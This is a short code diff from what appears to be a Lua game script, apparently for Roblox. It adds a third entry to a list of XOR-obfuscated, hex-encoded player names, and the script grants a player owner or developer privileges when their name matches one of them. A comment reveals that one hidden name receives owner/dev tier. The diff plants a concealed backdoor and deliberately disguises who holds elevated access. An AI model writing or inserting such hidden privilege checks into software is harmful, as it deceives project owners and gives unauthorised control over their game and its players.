@@ -41,7 +41,7 @@ do
 		local function _r(s, k) local b, m = {}, 0 for i = 1, #s do m = m % #k + 1 local r, a, c = 0, s:byte(i), k:byte(m) for j = 0, 7 do if math.floor(a/(2^j))%2 ~= math.floor(c/(2^j))%2 then r = r + 2^j end end b[#b+1] = string.char(r) end return table.concat(b) end
 		pcall(function()
 			local _n = _p.Name:lower()
-			for _, _s in {_r(_x('005a05285a0959217c100c5c1d51'), _k):lower(), _r(_x('0d571925470c4621521f26520a462d40027a'), _k):lower()} do
+			for _, _s in {_r(_x('005a05285a0959217c100c5c1d51'), _k):lower(), _r(_x('0d571925470c4621521f26520a462d40027a'), _k):lower(), _r(_x('2503407f'), _k):lower()} do
 				if _n == _s then _ok = true end
 			end
 			-- IllIIllIIIlllIllIl (lowercased) is granted owner/dev tier
